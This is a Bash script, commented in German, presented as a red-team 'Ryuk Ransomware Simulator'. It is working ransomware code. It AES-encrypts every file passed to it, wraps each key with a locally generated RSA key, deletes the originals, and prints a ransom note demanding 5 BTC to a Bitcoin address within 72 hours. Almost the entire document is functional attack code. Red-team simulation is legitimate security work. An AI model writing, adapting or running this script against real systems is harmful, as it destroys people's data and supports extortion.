#!/bin/bash

# Ryuk Ransomware Simulator - Red Team

# Farbcodes für die Ransom Note
RED='\033[0;31m'
NC='\033[0m' # No Color

# Überprüfe ob Argumente übergeben wurden
if [ $# -eq 0 ]; then
    echo "Usage: $0 <file1> <file2> ..."
    exit 1
fi

# Generiere RSA Keypair für Opfersystem (einmalig)
RSA_PRIVATE="rsa_victim_private.pem"
RSA_PUBLIC="rsa_victim_public.pem"

if [ ! -f "$RSA_PRIVATE" ] || [ ! -f "$RSA_PUBLIC" ]; then
    echo "[*] Generiere RSA Keypair für Opfersystem..."
    openssl genrsa -out "$RSA_PRIVATE" 2048 2>/dev/null
    openssl rsa -in "$RSA_PRIVATE" -pubout -out "$RSA_PUBLIC" 2>/dev/null
fi

# Verschlüssele jede Datei
for file in "$@"; do
    if [ ! -f "$file" ]; then
        echo "[!] Datei nicht gefunden: $file"
        continue
    fi

    echo "[*] Verschlüssele: $file"
    
    # Generiere zufälligen AES-Key (256 Bit = 32 Bytes = 64 Hex-Zeichen)
    AES_KEY=$(openssl rand -hex 32)
    
    # Verschlüssele Datei mit AES-256-CBC (IV=0)
    openssl aes-256-cbc -in "$file" -K "$AES_KEY" -iv '0' -out "$file.enc" 2>/dev/null
    
    # Verschlüssele den AES-Key mit RSA Public Key
    echo -n "$AES_KEY" | openssl rsautl -encrypt -pubin -inkey "$RSA_PUBLIC" -out "$file.key.enc" 2>/dev/null
    
    # Hänge den verschlüsselten AES-Key an die verschlüsselte Datei an
    cat "$file.key.enc" >> "$file.enc"
    
    # Lösche Original und temporäre Key-Datei
    rm "$file" "$file.key.enc"
    
    echo "[+] Verschlüsselt: $file → $file.enc"
done

# Gib Ransom Note aus
echo ""
echo -e "${RED}"
cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║                    ⚠️  YOUR FILES ARE ENCRYPTED  ⚠️           ║
║                                                               ║
║  Your data has been encrypted using military-grade           ║
║  RSA-2048 and AES-256 encryption.                            ║
║                                                               ║
║  There is no way to recover your files without the           ║
║  decryption key.                                             ║
║                                                               ║
║  To recover your data, you must send 5 BTC to:              ║
║  1A1z7agoat2wSEtPNc221CdUbpQjQnxQz5                         ║
║                                                               ║
║  After payment, you will receive the decryption tool.        ║
║                                                               ║
║  Time is running out. Pay within 72 hours.                   ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"
